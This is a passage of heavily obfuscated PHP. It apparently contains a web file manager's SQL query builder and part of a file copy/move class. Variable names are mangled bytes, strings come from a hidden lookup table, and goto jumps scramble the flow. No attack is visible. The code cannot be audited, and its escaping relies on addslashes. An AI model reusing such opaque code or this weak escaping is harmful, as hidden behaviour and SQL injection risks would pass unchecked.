$D¡ß•‘×ÏÜ[936]))) { $E¬Ú›Ö Û½ .= $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $fâ·î²³Ş[0] . $D¡ß•‘×ÏÜ[50] . $this->parseValue($fâ·î²³Ş[1]); } elseif (preg_match($D¡ß•‘×ÏÜ[937], $fâ·î²³Ş[0])) { $E¬Ú›Ö Û½ .= $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $this->exp[$b¾…¯…µ] . $D¡ß•‘×ÏÜ[50] . $this->parseValue($fâ·î²³Ş[1]); } elseif (preg_match($D¡ß•‘×ÏÜ[938], $fâ·î²³Ş[0])) { if (is_array($fâ·î²³Ş[1])) { $FÓó™Å–™— = isset($fâ·î²³Ş[2]) ? strtoupper($fâ·î²³Ş[2]) : $D¡ß•‘×ÏÜ[923]; if (in_array($FÓó™Å–™—, array($D¡ß•‘×ÏÜ[922], $D¡ß•‘×ÏÜ[923], $D¡ß•‘×ÏÜ[924]))) { $dÈŒ’²Ñéæ = array(); foreach ($fâ·î²³Ş[1] as $eè§Øì„ÆÂ) { $dÈŒ’²Ñéæ[] = $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $this->exp[$b¾…¯…µ] . $D¡ß•‘×ÏÜ[50] . $this->parseValue($eè§Øì„ÆÂ); } $E¬Ú›Ö Û½ .= $D¡ß•‘×ÏÜ[245] . implode($D¡ß•‘×ÏÜ[50] . $FÓó™Å–™— . $D¡ß•‘×ÏÜ[50], $dÈŒ’²Ñéæ) . $D¡ß•‘×ÏÜ[823]; } } else { $E¬Ú›Ö Û½ .= $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $this->exp[$b¾…¯…µ] . $D¡ß•‘×ÏÜ[50] . $this->parseValue($fâ·î²³Ş[1]); } } elseif ($D¡ß•‘×ÏÜ[282] == $b¾…¯…µ) { $E¬Ú›Ö Û½ .= $D¡ß•‘×ÏÜ[821] . $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $fâ·î²³Ş[1] . $D¡ß•‘×ÏÜ[939]; } elseif (preg_match($D¡ß•‘×ÏÜ[940], $fâ·î²³Ş[0])) { if (isset($fâ·î²³Ş[2]) && $D¡ß•‘×ÏÜ[282] == $fâ·î²³Ş[2]) { $E¬Ú›Ö Û½ .= $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $this->exp[$b¾…¯…µ] . $D¡ß•‘×ÏÜ[50] . $fâ·î²³Ş[1]; } else { if (is_string($fâ·î²³Ş[1])) { $fâ·î²³Ş[1] = explode($D¡ß•‘×ÏÜ[47], $fâ·î²³Ş[1]); } $b’ÇÒ½º¤® = implode($D¡ß•‘×ÏÜ[47], $this->parseValue($fâ·î²³Ş[1])); $E¬Ú›Ö Û½ .= $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $this->exp[$b¾…¯…µ] . $D¡ß•‘×ÏÜ[821] . $b’ÇÒ½º¤® . $D¡ß•‘×ÏÜ[823]; } } elseif (preg_match($D¡ß•‘×ÏÜ[941], $fâ·î²³Ş[0])) { $CÙë ßô¢ = is_string($fâ·î²³Ş[1]) ? explode($D¡ß•‘×ÏÜ[47], $fâ·î²³Ş[1]) : $fâ·î²³Ş[1]; $E¬Ú›Ö Û½ .= $D¡ß•‘×ÏÜ[821] . $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $this->exp[$b¾…¯…µ] . $D¡ß•‘×ÏÜ[50] . $this->parseValue($CÙë ßô¢[0]) . $D¡ß•‘×ÏÜ[925] . $this->parseValue($CÙë ßô¢[1]) . $D¡ß•‘×ÏÜ[263]; } else { think_exception(think_lang($D¡ß•‘×ÏÜ[928]) . $D¡ß•‘×ÏÜ[4] . $fâ·î²³Ş[0]); } } else { $e®éïµÁ‹â = count($fâ·î²³Ş); $bª«¦–çœÊ = isset($fâ·î²³Ş[$e®éïµÁ‹â - 1]) ? strtoupper($fâ·î²³Ş[$e®éïµÁ‹â - 1]) : $D¡ß•‘×ÏÜ[33]; if (in_array($bª«¦–çœÊ, array($D¡ß•‘×ÏÜ[922], $D¡ß•‘×ÏÜ[923], $D¡ß•‘×ÏÜ[924]))) { $e®éïµÁ‹â = $e®éïµÁ‹â - 1; } else { $bª«¦–çœÊ = $D¡ß•‘×ÏÜ[922]; } for ($F×·ßáö† = 0; $F×·ßáö† < $e®éïµÁ‹â; $F×·ßáö†++) { $CÙë ßô¢ = is_array($fâ·î²³Ş[$F×·ßáö†]) ? $fâ·î²³Ş[$F×·ßáö†][1] : $fâ·î²³Ş[$F×·ßáö†]; if ($D¡ß•‘×ÏÜ[282] == strtolower($fâ·î²³Ş[$F×·ßáö†][0])) { $E¬Ú›Ö Û½ .= $D¡ß•‘×ÏÜ[245] . $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $CÙë ßô¢ . $D¡ß•‘×ÏÜ[939] . $bª«¦–çœÊ . $D¡ß•‘×ÏÜ[50]; } else { $BÙÅé‘Å™® = is_array($fâ·î²³Ş[$F×·ßáö†]) ? $this->exp[strtolower($fâ·î²³Ş[$F×·ßáö†][0])] : $D¡ß•‘×ÏÜ[914]; if (!$BÙÅé‘Å™® && is_array($fâ·î²³Ş[$F×·ßáö†]) && in_array($fâ·î²³Ş[$F×·ßáö†][0], array($D¡ß•‘×ÏÜ[914], $D¡ß•‘×ÏÜ[932], $D¡ß•‘×ÏÜ[933], $D¡ß•‘×ÏÜ[934], $D¡ß•‘×ÏÜ[935], $D¡ß•‘×ÏÜ[936]))) { $BÙÅé‘Å™® = $fâ·î²³Ş[$F×·ßáö†][0]; } $E¬Ú›Ö Û½ .= $D¡ß•‘×ÏÜ[245] . $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[50] . $BÙÅé‘Å™® . $D¡ß•‘×ÏÜ[50] . $this->parseValue($CÙë ßô¢) . $D¡ß•‘×ÏÜ[939] . $bª«¦–çœÊ . $D¡ß•‘×ÏÜ[50]; } } $E¬Ú›Ö Û½ = substr($E¬Ú›Ö Û½, 0, -4); } } else { $E¬Ú›Ö Û½ .= $f•ê¾ºµíÛ . $D¡ß•‘×ÏÜ[942] . $this->parseValue($fâ·î²³Ş); } return $E¬Ú›Ö Û½; } protected function parseThinkWhere($eˆ”Ûø¶ÑÉ, $CÔ¬ÎğÒøó) { $aÀÂ«„¾æ =& $_SERVER[¿õñ]; $D”ï‚¾®”Í = $aÀÂ«„¾æ[33]; switch ($eˆ”Ûø¶ÑÉ) { case $aÀÂ«„¾æ[335]: $D”ï‚¾®”Í = $CÔ¬ÎğÒøó; break; case $aÀÂ«„¾æ[926]: $D”ï‚¾®”Í = is_string($CÔ¬ÎğÒøó) ? $CÔ¬ÎğÒøó : substr($this->parseWhere($CÔ¬ÎğÒøó), 6); break; case $aÀÂ«„¾æ[943]: parse_str($CÔ¬ÎğÒøó, $aØøÚ¤); if (isset($aØøÚ¤[$aÀÂ«„¾æ[921]])) { $båÎšÑŞÑğ = $aÀÂ«„¾æ[50] . strtoupper($aØøÚ¤[$aÀÂ«„¾æ[921]]) . $aÀÂ«„¾æ[50]; unset($aØøÚ¤[$aÀÂ«„¾æ[921]]); } else { $båÎšÑŞÑğ = $aÀÂ«„¾æ[925]; } $Bº’ğÃÉ¦ = array(); foreach ($aØøÚ¤ as $cŸªáø¦†È => $DÜìëƒİÊ”) { $Bº’ğÃÉ¦[] = $this->parseKey($cŸªáø¦†È) . $aÀÂ«„¾æ[942] . $this->parseValue($DÜìëƒİÊ”); } $D”ï‚¾®”Í = implode($båÎšÑŞÑğ, $Bº’ğÃÉ¦); break; } return $D”ï‚¾®”Í; } protected function parseLimit($eî£Ü’…Ÿò) { $CíÓÓ”«ê =& $_SERVER[¿õñ]; return !empty($eî£Ü’…Ÿò) ? $CíÓÓ”«ê[48] . $eî£Ü’…Ÿò . $CíÓÓ”«ê[50] : $CíÓÓ”«ê[33]; } protected function parseJoin($Eù‘êù) { $bˆ˜Ü³¸  =& $_SERVER[¿õñ]; $b¤Ö‘Ä¢ì = $bˆ˜Ü³¸ [33]; if (!empty($Eù‘êù)) { if (is_array($Eù‘êù)) { foreach ($Eù‘êù as $fğÏ­ƒõ => $c„ÌàóğñÜ) { if (!1 !== stripos($c„ÌàóğñÜ, $bˆ˜Ü³¸ [944])) { $b¤Ö‘Ä¢ì .= $bˆ˜Ü³¸ [50] . $c„ÌàóğñÜ; } else { $b¤Ö‘Ä¢ì .= $bˆ˜Ü³¸ [945] . $c„ÌàóğñÜ; } } } else { $b¤Ö‘Ä¢ì .= $bˆ˜Ü³¸ [945] . $Eù‘êù; } } $b¤Ö‘Ä¢ì = preg_replace($bˆ˜Ü³¸ [946], think_config($bˆ˜Ü³¸ [849]) . $bˆ˜Ü³¸ [947], $b¤Ö‘Ä¢ì); return $b¤Ö‘Ä¢ì; } protected function parseOrder($CÑßŒ…Ö·) { $BŸÈí®Íİ =& $_SERVER[¿õñ]; if (is_array($CÑßŒ…Ö·)) { $f›ñÖ¥ƒŠ = array(); foreach ($CÑßŒ…Ö· as $dÅ¶ÖÛ‘Šã => $e“©ğä®†¬) { if (is_numeric($dÅ¶ÖÛ‘Šã)) { $f›ñÖ¥ƒŠ[] = $this->parseKey($e“©ğä®†¬); } else { $e“©ğä®†¬ = in_array(strtoupper(trim($e“©ğä®†¬)), array($BŸÈí®Íİ[948], $BŸÈí®Íİ[949])) ? $BŸÈí®Íİ[50] . $e“©ğä®†¬ : $BŸÈí®Íİ[33]; if (preg_match($BŸÈí®Íİ[950], $dÅ¶ÖÛ‘Šã)) { $f›ñÖ¥ƒŠ[] = $this->parseKey($dÅ¶ÖÛ‘Šã) . $e“©ğä®†¬; } else { think_exception($BŸÈí®Íİ[951] . $dÅ¶ÖÛ‘Šã); } } } $CÑßŒ…Ö· = implode($BŸÈí®Íİ[47], $f›ñÖ¥ƒŠ); } return !empty($CÑßŒ…Ö·) ? $BŸÈí®Íİ[952] . $CÑßŒ…Ö· : $BŸÈí®Íİ[33]; } protected function parseGroup($bªƒ¼É†ŞŒ) { $E‹ÜÃ¥çæ‹ =& $_SERVER[¿õñ]; return !empty($bªƒ¼É†ŞŒ) ? $E‹ÜÃ¥çæ‹[953] . $bªƒ¼É†ŞŒ : $E‹ÜÃ¥çæ‹[33]; } protected function parseHaving($B”ã™±ÒÅİ) { $aÓø¤¾¾àÅ =& $_SERVER[¿õñ]; return !empty($B”ã™±ÒÅİ) ? $aÓø¤¾¾àÅ[954] . $B”ã™±ÒÅİ : $aÓø¤¾¾àÅ[33]; } protected function parseComment($F¯ïàÔÕåè) { $A¤¡°‘á¬ =& $_SERVER[¿õñ]; return !empty($F¯ïàÔÕåè) ? $A¤¡°‘á¬[955] . $F¯ïàÔÕåè . $A¤¡°‘á¬[956] : $A¤¡°‘á¬[33]; } protected function parseDistinct($E®ºÖ¬İ†î) { $E‡“Ñ‚†‹Õ =& $_SERVER[¿õñ]; return !empty($E®ºÖ¬İ†î) ? $E‡“Ñ‚†‹Õ[957] : $E‡“Ñ‚†‹Õ[33]; } protected function parseUnion($f…î¬˜Ë³â) { $bÜ‡›ôˆìº =& $_SERVER[¿õñ]; if (empty($f…î¬˜Ë³â)) { return $bÜ‡›ôˆìº[33]; } if (isset($f…î¬˜Ë³â[$bÜ‡›ôˆìº[333]])) { $dÀ‹´¹¤–¢ = $bÜ‡›ôˆìº[958]; unset($f…î¬˜Ë³â[$bÜ‡›ôˆìº[333]]); } else { $dÀ‹´¹¤–¢ = $bÜ‡›ôˆìº[959]; } foreach ($f…î¬˜Ë³â as $cî“†ÕÌİª) { $E·¸ìÃ½³[] = $dÀ‹´¹¤–¢ . (is_array($cî“†ÕÌİª) ? $this->buildSelectSql($cî“†ÕÌİª) : $cî“†ÕÌİª); } return implode($bÜ‡›ôˆìº[50], $E·¸ìÃ½³); } public function insert($e‘Ş¯Ö§à, $B½ïÉÙêÎë = array(), $Cë®äùİè¡ = false) { goto B¼ø™†ÃĞ; DÖã³Ë“‚: foreach ($e‘Ş¯Ö§à as $d„ˆÌ»†Æ => $fäÇ»Î…ö‰) { if (is_array($fäÇ»Î…ö‰) && $cƒ ª–ÆÇŸ[282] == $fäÇ»Î…ö‰[0]) { $Aç¦È›Ãİ[] = $this->parseKey($d„ˆÌ»†Æ); $C¾ôÉŒ¢†ä[] = $fäÇ»Î…ö‰[1]; } elseif (is_scalar($fäÇ»Î…ö‰) || is_null($fäÇ»Î…ö‰)) { $Aç¦È›Ãİ[] = $this->parseKey($d„ˆÌ»†Æ); $C¾ôÉŒ¢†ä[] = $this->parseValue($fäÇ»Î…ö‰); } } $E¶¢¸Ö½öÑ = ($Cë®äùİè¡ ? $cƒ ª–ÆÇŸ[825] : $cƒ ª–ÆÇŸ[826]) . $cƒ ª–ÆÇŸ[827] . $this->parseTable($B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[264]]) . $cƒ ª–ÆÇŸ[821] . implode($cƒ ª–ÆÇŸ[47], $Aç¦È›Ãİ) . $cƒ ª–ÆÇŸ[822] . implode($cƒ ª–ÆÇŸ[47], $C¾ôÉŒ¢†ä) . $cƒ ª–ÆÇŸ[823]; $E¶¢¸Ö½öÑ .= $this->parseLock(isset($B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[776]]) ? $B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[776]] : !1); goto dÚ…Æ¨ùàµ; B¼ø™†ÃĞ: $cƒ ª–ÆÇŸ =& $_SERVER[¿õñ]; $C¾ôÉŒ¢†ä = $Aç¦È›Ãİ = array(); $this->model = $B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[266]]; goto DÖã³Ë“‚; dÚ…Æ¨ùàµ: $E¶¢¸Ö½öÑ .= $this->parseComment(!empty($B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[337]]) ? $B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[337]] : $cƒ ª–ÆÇŸ[33]); return $this->execute($E¶¢¸Ö½öÑ, $this->parseBind(!empty($B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[270]]) ? $B½ïÉÙêÎë[$cƒ ª–ÆÇŸ[270]] : array())); goto b‹²Ã»‚æÌ; b‹²Ã»‚æÌ: } public function selectInsert($C†µ ¤†, $D¸Ó¬ó¤ÈÉ, $eœƒÛŒÍ¥Ó = array()) { goto dÁªŒØÙÑœ; Eğ¢´˜ì¤÷: array_walk($C†µ ¤†, array($this, $eÑ†·ê¹å[824])); $E„µÒóª  = $eÑ†·ê¹å[960] . $this->parseTable($D¸Ó¬ó¤ÈÉ) . $eÑ†·ê¹å[821] . implode($eÑ†·ê¹å[47], $C†µ ¤†) . $eÑ†·ê¹å[939]; $E„µÒóª  .= $this->buildSelectSql($eœƒÛŒÍ¥Ó); goto FÃ×Ø±Á«Û; FÃ×Ø±Á«Û: return $this->execute($E„µÒóª , $this->parseBind(!empty($eœƒÛŒÍ¥Ó[$eÑ†·ê¹å[270]]) ? $eœƒÛŒÍ¥Ó[$eÑ†·ê¹å[270]] : array())); goto DªÙ«ÙÍéæ; dÁªŒØÙÑœ: $eÑ†·ê¹å =& $_SERVER[¿õñ]; $this->model = $eœƒÛŒÍ¥Ó[$eÑ†·ê¹å[266]]; if (is_string($C†µ ¤†)) { $C†µ ¤† = explode($eÑ†·ê¹å[47], $C†µ ¤†); } goto Eğ¢´˜ì¤÷; DªÙ«ÙÍéæ: } public function update($DîçÆ¡Ü‡, $AêÄäïÒ£«) { $D×™­†“ã› =& $_SERVER[¿õñ]; $this->model = $AêÄäïÒ£«[$D×™­†“ã›[266]]; $AÜ‘õ§Øô÷ = $D×™­†“ã›[961] . $this->parseTable($AêÄäïÒ£«[$D×™­†“ã›[264]]) . $this->parseSet($DîçÆ¡Ü‡) . $this->parseWhere(!empty($AêÄäïÒ£«[$D×™­†“ã›[260]]) ? $AêÄäïÒ£«[$D×™­†“ã›[260]] : $D×™­†“ã›[33]) . $this->parseOrder(!empty($AêÄäïÒ£«[$D×™­†“ã›[346]]) ? $AêÄäïÒ£«[$D×™­†“ã›[346]] : $D×™­†“ã›[33]) . $this->parseLimit(!empty($AêÄäïÒ£«[$D×™­†“ã›[277]]) ? $AêÄäïÒ£«[$D×™­†“ã›[277]] : $D×™­†“ã›[33]) . $this->parseLock(isset($AêÄäïÒ£«[$D×™­†“ã›[776]]) ? $AêÄäïÒ£«[$D×™­†“ã›[776]] : !1) . $this->parseComment(!empty($AêÄäïÒ£«[$D×™­†“ã›[337]]) ? $AêÄäïÒ£«[$D×™­†“ã›[337]] : $D×™­†“ã›[33]); return $this->execute($AÜ‘õ§Øô÷, $this->parseBind(!empty($AêÄäïÒ£«[$D×™­†“ã›[270]]) ? $AêÄäïÒ£«[$D×™­†“ã›[270]] : array())); } public function delete($D±—Ó­Õ¹ö = array()) { $a–èêˆ £ =& $_SERVER[¿õñ]; $this->model = $D±—Ó­Õ¹ö[$a–èêˆ £[266]]; $DÍ‚Îè°Óç = $a–èêˆ £[962] . $this->parseTable($D±—Ó­Õ¹ö[$a–èêˆ £[264]]) . $this->parseWhere(!empty($D±—Ó­Õ¹ö[$a–èêˆ £[260]]) ? $D±—Ó­Õ¹ö[$a–èêˆ £[260]] : $a–èêˆ £[33]) . $this->parseOrder(!empty($D±—Ó­Õ¹ö[$a–èêˆ £[346]]) ? $D±—Ó­Õ¹ö[$a–èêˆ £[346]] : $a–èêˆ £[33]) . $this->parseLimit(!empty($D±—Ó­Õ¹ö[$a–èêˆ £[277]]) ? $D±—Ó­Õ¹ö[$a–èêˆ £[277]] : $a–èêˆ £[33]) . $this->parseLock(isset($D±—Ó­Õ¹ö[$a–èêˆ £[776]]) ? $D±—Ó­Õ¹ö[$a–èêˆ £[776]] : !1) . $this->parseComment(!empty($D±—Ó­Õ¹ö[$a–èêˆ £[337]]) ? $D±—Ó­Õ¹ö[$a–èêˆ £[337]] : $a–èêˆ £[33]); return $this->execute($DÍ‚Îè°Óç, $this->parseBind(!empty($D±—Ó­Õ¹ö[$a–èêˆ £[270]]) ? $D±—Ó­Õ¹ö[$a–èêˆ £[270]] : array())); } public function select($cß‰¢¯ŸÛ = array()) { goto cƒØá‰„ŞÖ; a¬–éîŠï: $C«ÉÒƒ±Ÿ = isset($cß‰¢¯ŸÛ[$EÅº¥„‰‡[334]]) ? $cß‰¢¯ŸÛ[$EÅº¥„‰‡[334]] : !1; if ($C«ÉÒƒ±Ÿ) { $eÙÀ·ç­ÈŸ = is_string($C«ÉÒƒ±Ÿ[$EÅº¥„‰‡[88]]) ? $C«ÉÒƒ±Ÿ[$EÅº¥„‰‡[88]] : $EÅº¥„‰‡[963] . md5($E‡ĞË½¶®Ì); $d’×á§ØŠ² = think_cache($eÙÀ·ç­ÈŸ, $EÅº¥„‰‡[33], $C«ÉÒƒ±Ÿ); if (!1 !== $d’×á§ØŠ²) { return $d’×á§ØŠ²; } } $Bà¯Û¡ñÇ = $this->query($E‡ĞË½¶®Ì, $this->parseBind(!empty($cß‰¢¯ŸÛ[$EÅº¥„‰‡[270]]) ? $cß‰¢¯ŸÛ[$EÅº¥„‰‡[270]] : array())); goto c³“…¸ğä›; cƒØá‰„ŞÖ: $EÅº¥„‰‡ =& $_SERVER[¿õñ]; $this->model = $cß‰¢¯ŸÛ[$EÅº¥„‰‡[266]]; $E‡ĞË½¶®Ì = $this->buildSelectSql($cß‰¢¯ŸÛ); goto a¬–éîŠï; c³“…¸ğä›: if ($C«ÉÒƒ±Ÿ && !1 !== $Bà¯Û¡ñÇ) { think_cache($eÙÀ·ç­ÈŸ, $Bà¯Û¡ñÇ, $C«ÉÒƒ±Ÿ); } return $Bà¯Û¡ñÇ; goto DŒ—İã¸ßÒ; DŒ—İã¸ßÒ: } public function buildSelectSql($cò¨àçôØœ = array()) { goto b–±ÑèÙ¢; EŠ×”˜æ† : $D­‡Îµì•í = $this->parseSql($this->selectSql, $cò¨àçôØœ); $D­‡Îµì•í .= $this->parseLock(isset($cò¨àçôØœ[$bĞòÙË‘õ[776]]) ? $cò¨àçôØœ[$bĞòÙË‘õ[776]] : !1); if (isset($E“Œò´…³)) { think_cache($E“Œò´…³, $D­‡Îµì•í); } goto EøÕö×í³³; EøÕö×í³³: return $D­‡Îµì•í; goto eåŞê™¡•õ; b–±ÑèÙ¢: $bĞòÙË‘õ =& $_SERVER[¿õñ]; if (isset($cò¨àçôØœ[$bĞòÙË‘õ[336]])) { if (strpos($cò¨àçôØœ[$bĞòÙË‘õ[336]], $bĞòÙË‘õ[47])) { list($fâ©ÛÑõë, $b´Š„Í¬“Û) = explode($bĞòÙË‘õ[47], $cò¨àçôØœ[$bĞòÙË‘õ[336]]); } else { $fâ©ÛÑõë = $cò¨àçôØœ[$bĞòÙË‘õ[336]]; } $fâ©ÛÑõë = $fâ©ÛÑõë ? $fâ©ÛÑõë : 1; $b´Š„Í¬“Û = isset($b´Š„Í¬“Û) ? $b´Š„Í¬“Û : (is_numeric($cò¨àçôØœ[$bĞòÙË‘õ[277]]) ? $cò¨àçôØœ[$bĞòÙË‘õ[277]] : 20); $aÄ²¢ê³± = $b´Š„Í¬“Û * ((int) $fâ©ÛÑõë - 1); $cò¨àçôØœ[$bĞòÙË‘õ[277]] = $aÄ²¢ê³± . $bĞòÙË‘õ[47] . $b´Š„Í¬“Û; } if (think_config($bĞòÙË‘õ[964])) { $E“Œò´…³ = $bĞòÙË‘õ[965] . md5(serialize($cò¨àçôØœ)); $eåÃÜ„Àº = think_cache($E“Œò´…³); if ($eåÃÜ„Àº) { return $eåÃÜ„Àº; } } goto EŠ×”˜æ† ; eåŞê™¡•õ: } public function parseSql($cÖéŸß¿, $a¢Ã»®Š = array()) { $cÛ·­¨³Š =& $_SERVER[¿õñ]; $cÖéŸß¿ = str_replace(array($cÛ·­¨³Š[966], $cÛ·­¨³Š[967], $cÛ·­¨³Š[968], $cÛ·­¨³Š[969], $cÛ·­¨³Š[970], $cÛ·­¨³Š[971], $cÛ·­¨³Š[972], $cÛ·­¨³Š[973], $cÛ·­¨³Š[974], $cÛ·­¨³Š[975], $cÛ·­¨³Š[976]), array($this->parseTable("{$a¢Ã»®Š[$cÛ·­¨³Š[264]]}"), $this->parseDistinct(isset($a¢Ã»®Š[$cÛ·­¨³Š[977]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[977]] : !1), $this->parseField(!empty($a¢Ã»®Š[$cÛ·­¨³Š[258]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[258]] : $cÛ·­¨³Š[173]), $this->parseJoin(!empty($a¢Ã»®Š[$cÛ·­¨³Š[267]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[267]] : $cÛ·­¨³Š[33]), $this->parseWhere(!empty($a¢Ã»®Š[$cÛ·­¨³Š[260]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[260]] : $cÛ·­¨³Š[33]), $this->parseGroup(!empty($a¢Ã»®Š[$cÛ·­¨³Š[978]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[978]] : $cÛ·­¨³Š[33]), $this->parseHaving(!empty($a¢Ã»®Š[$cÛ·­¨³Š[979]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[979]] : $cÛ·­¨³Š[33]), $this->parseOrder(!empty($a¢Ã»®Š[$cÛ·­¨³Š[346]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[346]] : $cÛ·­¨³Š[33]), $this->parseLimit(!empty($a¢Ã»®Š[$cÛ·­¨³Š[277]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[277]] : $cÛ·­¨³Š[33]), $this->parseUnion(!empty($a¢Ã»®Š[$cÛ·­¨³Š[332]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[332]] : $cÛ·­¨³Š[33]), $this->parseComment(!empty($a¢Ã»®Š[$cÛ·­¨³Š[337]]) ? $a¢Ã»®Š[$cÛ·­¨³Š[337]] : $cÛ·­¨³Š[33])), $cÖéŸß¿); return $cÖéŸß¿; } public function getLastSql($B ³¼œƒî = '') { return $B ³¼œƒî ? $this->modelSql[$B ³¼œƒî] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fĞã³ø÷º) { return addslashes($fĞã³ø÷º); } public function setModel($céÂ¯Æ¿¨) { $this->model = $céÂ¯Æ¿¨; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aÆíâ÷¾Íˆ, $e¹ì«Ù¯×à) { $EŞİÀİè°ˆ = self::driverMake($e¹ì«Ù¯×à[0]); if (method_exists($EŞİÀİè°ˆ, $aÆíâ÷¾Íˆ)) { return @call_user_func_array(array($EŞİÀİè°ˆ, $aÆíâ÷¾Íˆ), $e¹ì«Ù¯×à); } if (method_exists($EŞİÀİè°ˆ, $_SERVER[¿õñ][980])) { return @call_user_func_array(array($EŞİÀİè°ˆ, $aÆíâ÷¾Íˆ), $e¹ì«Ù¯×à); } else { if (method_exists(self, $aÆíâ÷¾Íˆ)) { return @call_user_func_array(array(self, $aÆíâ÷¾Íˆ), $e¹ì«Ù¯×à); } else { call_user_func_array(array(parent, $aÆíâ÷¾Íˆ), $e¹ì«Ù¯×à); } } } public static function init($fÃĞÊØ„ì) { return self::driverMake($fÃĞÊØ„ì); } public static function copy($b„çÇÕ…öù, $Fë´®§î¬î, $cã”òÔŠ¿– = false, $AğÌª†ª¬² = false) { return self::copyMove($b„çÇÕ…öù, $Fë´®§î¬î, $cã”òÔŠ¿–, $_SERVER[¿õñ][482], $AğÌª†ª¬²); } public static function move($E¶ö÷î¥›Ú, $DÈ¼ƒ¯„ï†, $Dª¯×½‘±“ = false, $Fõô¿–çÖ§ = false) { return self::copyMove($E¶ö÷î¥›Ú, $DÈ¼ƒ¯„ï†, $Dª¯×½‘±“, $_SERVER[¿õñ][484], $Fõô¿–çÖ§); } public static function saveFile($bÙ³Ó¦¡, $côìîÔï„ù, $BÑ¸Š¨Ñš = true) { goto dö‚ßİÏØ½; c¶š…‡: $B×ãìîíš¾ = self::copyFile($bØù¶ªšÌ, $bÙ³Ó¦¡, $f„¥›œ±¼…, $DÆÕ„Ó°ñò, $Cïê›Ø–[$a°‚§½Ä‰[28]], $BÒ™¡âèŠ); if ($dË–¡¹ğš‡) { $B×ãìîíš¾ = $dË–¡¹ğš‡->getPathOuter($B×ãìîíš¾); } return $B×ãìîíš¾; goto AÜ”ãÔ†‡”; dö‚ßİÏØ½: $a°‚§½Ä‰ =& $_SERVER[¿õñ]; $Cïê›Ø– = self::info($côìîÔï„ù); $bØù¶ªšÌ = self::driverMake($bÙ³Ó¦¡); goto b„Ûİ©íÕÀ; b„Ûİ©íÕÀ: $f„¥›œ±¼… = self::driverMake($côìîÔï„ù); $dË–¡¹ğš‡ = !1; if ($f„¥›œ±¼…->pathParse[$a°‚§½Ä‰[981]]) { $e˜ººæÁï´ = $f„¥›œ±¼…->pathParse[$a°‚§½Ä‰[981]]; $dË–¡¹ğš‡ = $f„¥›œ±¼…; $f„¥›œ±¼… = self::driverMake($e˜ººæÁï´); } goto b„ØÇ²‹¢µ; b„ØÇ²‹¢µ: $DÆÕ„Ó°ñò = $f„¥›œ±¼…->pathFather($côìîÔï„ù); $BÒ™¡âèŠ = !0; if (!$BÑ¸Š¨Ñš && self::driverIsSame($bØù¶ªšÌ, $f„¥›œ±¼…)) { $BÒ™¡âèŠ = !1; } goto c¶š…‡; AÜ”ãÔ†‡”: } private static function copyMove($CÇëÖîæ½, $eãŠà÷ÑĞ, $Eğß‚ôº¤, $døİ„³ï‡«, $eöíÔèâŒç = false) { goto F½¦ÕÙ´‘‹; d¸½š‰ä™: if ($D™ñ­ÂÒÄ) { $B°ÃÔàÊ¿Á = $D™ñ­ÂÒÄ->getPathOuter($B°ÃÔàÊ¿Á); } return $B°ÃÔàÊ¿Á; goto A¡Û•›ÉÁ©; fâîÂ£Ã¿: $D™ñ­ÂÒÄ = !1; if ($dßƒ¨Ëˆæó->pathParse[$fÇ¥õ—ØŞ×[981]]) { $eãŠà÷ÑĞ = $dßƒ¨Ëˆæó->pathParse[$fÇ¥õ—ØŞ×[981]]; $D™ñ­ÂÒÄ = $dßƒ¨Ëˆæó; $dßƒ¨Ëˆæó = self::driverMake($eãŠà÷ÑĞ); } self::check($FÑÍ…í‚Ş‘, $CÇëÖîæ½, $dßƒ¨Ëˆæó, $eãŠà÷ÑĞ); goto fİ”ªèò‚Î; DÔ¢·Æ§‡: $E‘ÊÄŸ„± = $FÑÍ…í‚Ş‘->isFile($CÇëÖîæ½); if (!$E‘ÊÄŸ„± && $dßƒ¨Ëˆæó->getType() == $fÇ¥õ—ØŞ×[691] && $FÑÍ…í‚Ş‘->getType() == $fÇ¥õ—ØŞ×[102]) { $B°ÃÔàÊ¿Á = $dßƒ¨Ëˆæó->copyFolderFromIO($FÑÍ…í‚Ş‘, $CÇëÖîæ½, $eãŠà÷ÑĞ, $Eğß‚ôº¤, $c©Š¡‹Èñ, $eöíÔèâŒç); } else { $B°ÃÔàÊ¿Á = self::copyPath($FÑÍ…í‚Ş‘, $CÇëÖîæ½, $dßƒ¨Ëˆæó, $eãŠà÷ÑĞ, $Eğß‚ôº¤, $c©Š¡‹Èñ, $E‘ÊÄŸ„±, $eöíÔèâŒç); } if ($B°ÃÔàÊ¿Á && $c©Š¡‹Èñ) { $FÑÍ…í‚Ş‘->remove($CÇëÖîæ½); } goto d¸½š‰ä™; F½¦ÕÙ´‘‹: $fÇ¥õ—ØŞ× =& $_SERVER[¿õñ]; if (!$CÇëÖîæ½ || $CÇëÖîæ½ == 